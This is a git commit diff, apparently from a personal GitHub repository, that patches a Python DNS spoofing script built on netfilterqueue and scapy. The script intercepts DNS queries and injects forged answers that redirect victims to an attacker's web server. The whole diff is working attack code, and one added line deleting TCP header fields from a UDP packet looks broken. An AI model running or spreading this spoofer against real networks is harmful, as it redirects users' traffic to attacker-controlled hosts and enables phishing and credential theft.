206b1d2b85933152212959d0238393fd66ae311f
Hambihambi <134943206+Hambihambi@users.noreply.github.com>
2025-09-29 23:57:52 +0300

    Update dns_spoof.py
    Bugs patched

--- DNS_spoofer/dns_spoof.py
+++ DNS_spoofer/dns_spoof.py
@@ -3,7 +3,7 @@
 import netfilterqueue
 import scapy.all as scapy
 
-def processpacket(packet):
+def process_packet(packet):
     # convert the NetFilter packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
     # check if the request has a DNS Resource Record and a qname in a DNS Question Record (containing the requested URL)
@@ -11,23 +11,26 @@ def processpacket(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if qname:
             # forge the Response and inject it
-            answer = scapy.DNSRR(rrname=qname, rdata="GIVE YOUR WEBSERVERS IP HERE")
+            # replace with your webserver's IP
+            answer = scapy.DNSRR(rrname=qname, rdata="1.2.3.4")
             scapy_packet[scapy.DNS].an = answer
             # set the number of answers according to the forged Responses number
             scapy_packet[scapy.DNS].ancount = 1
             # delete the checksum and the length values of the forged packet to avoid packet corruption
-            # from both IP and Transport headers
+            # remove these fields from both IP and Transport headers, considering DNS TCP fallback
             # scapy recalculates these values
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.TCP].len
+            del scapy_packet[scapy.TCP].chksum
 
             #reconvert the scapy packet
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
-            print("[+] Spoofing target\n")
-            
+            print(f"[+] Spoofing target: {qname}\n")
+    
     # .drop or .access the packet
     packet.accept()
 
